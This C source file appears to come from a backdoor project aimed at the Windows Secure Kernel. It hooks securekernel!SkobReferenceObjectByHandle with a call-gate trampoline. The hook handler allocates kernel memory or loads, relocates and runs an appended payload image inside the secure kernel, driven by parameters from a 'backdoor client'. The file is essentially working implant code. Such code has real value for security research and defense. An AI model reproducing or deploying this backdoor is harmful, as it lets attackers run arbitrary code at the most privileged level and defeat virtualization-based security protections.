#include "stdafx.h"

// size of the call stub
#define MAX_CALLGATE_LEN 0x40

typedef NTSTATUS (NTAPI * func_SkobReferenceObjectByHandle)(
    HANDLE Handle,
    ACCESS_MASK DesiredAccess,
    POBJECT_TYPE ObjectType,
    KPROCESSOR_MODE AccessMode,
    PVOID *Object,
    PVOID HandleInformation
);

// parameters passed from the backdoor client
DRIVER_SK_PARAMS m_Params;

// callgate for original securekernel!SkobReferenceObjectByHandle()
UCHAR old_SkobReferenceObjectByHandle[MAX_CALLGATE_LEN];
//--------------------------------------------------------------------------------------
void PayloadAlloc(void)
{
    ULONG MemSize = (m_Params.PayloadPagesCount + 1) * PAGE_SIZE;

    // allocate memory for the payload
    PVOID Mem = I_SkAllocatePool(NonPagedPool, MemSize, 0);
    if (Mem)
    {
        memset(Mem, 0, MemSize);

        I_DbgPrintEx(DBG_ID, DBG_LEVEL, __FUNCTION__"(): Memory is at "IFMT", 0x%x bytes\n", Mem, MemSize);
        
        // return heap address aligned by page boundary
        m_Params.PayloadPages = (PVOID)_ALIGN_UP((ULONG_PTR)Mem, PAGE_SIZE);
    }
    else
    {
        I_DbgPrintEx(DBG_ID, DBG_LEVEL, "ERROR: MmAllocateNonCachedMemory() fails\n");
    }
}
//--------------------------------------------------------------------------------------
void PayloadRun(void)
{
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)
        RVATOVA(m_Params.DriverBase, ((PIMAGE_DOS_HEADER)m_Params.DriverBase)->e_lfanew);

    // get pointer to the payload image
    PVOID Image = RVATOVA(m_Params.DriverBase, pHeaders->OptionalHeader.SizeOfImage);

    I_DbgPrintEx(DBG_ID, DBG_LEVEL, __FUNCTION__"(): Payload image is at "IFMT"\n", Image);

    pHeaders = (PIMAGE_NT_HEADERS)
        RVATOVA(Image, ((PIMAGE_DOS_HEADER)Image)->e_lfanew);

    if (!LdrProcessRelocs(Image, Image))
    {
        I_DbgPrintEx(DBG_ID, DBG_LEVEL, "ERROR: LdrProcessRelocs() fails\n");
        return;
    }

    if (!RuntimeProcessImports(Image))
    {
        I_DbgPrintEx(DBG_ID, DBG_LEVEL, "ERROR: RuntimeProcessImports() fails\n");
        return;
    }

    // report successful payload load
    m_Params.PayloadPages = Image;

    PDRIVER_INITIALIZE DriverInit = (PDRIVER_INITIALIZE)
        RVATOVA(Image, pHeaders->OptionalHeader.AddressOfEntryPoint);

    // call payload image entry point
    Status = DriverInit(NULL, NULL);

    I_DbgPrintEx(DBG_ID, DBG_LEVEL, __FUNCTION__"(): Status = 0x%.8x\n", Status);
}
//--------------------------------------------------------------------------------------
void DriverMain(void)
{ 
    lock_aquire();

    // check if hook handler wasn't executed yet
    if (m_Params.CallCount == 0)
    {
        I_DbgPrintEx(DBG_ID, DBG_LEVEL, __FUNCTION__"()\n");

        if (m_Params.bAllocOnly)
        {
            // just allocate kernel memoty for the payload
            PayloadAlloc();
        }
        else
        {
            // load and execute payload
            PayloadRun();
        }
    }

    m_Params.CallCount += 1;

    lock_release();    
}
//--------------------------------------------------------------------------------------
NTSTATUS NTAPI new_SkobReferenceObjectByHandle(
    HANDLE Handle,
    ACCESS_MASK DesiredAccess,
    POBJECT_TYPE ObjectType,
    KPROCESSOR_MODE AccessMode,
    PVOID *Object,
    PVOID HandleInformation)
{
    // exeute main function
    DriverMain();

    // call original function
    return ((func_SkobReferenceObjectByHandle)&old_SkobReferenceObjectByHandle)(
        Handle,
        DesiredAccess,
        ObjectType,
        AccessMode,
        Object,
        HandleInformation
    );
}
//--------------------------------------------------------------------------------------
NTSTATUS DriverEntry(
    PDRIVER_OBJECT  DriverObject,
    PUNICODE_STRING RegistryPath)
{
    return STATUS_UNSUCCESSFUL;
}
//--------------------------------------------------------------------------------------
// EoF
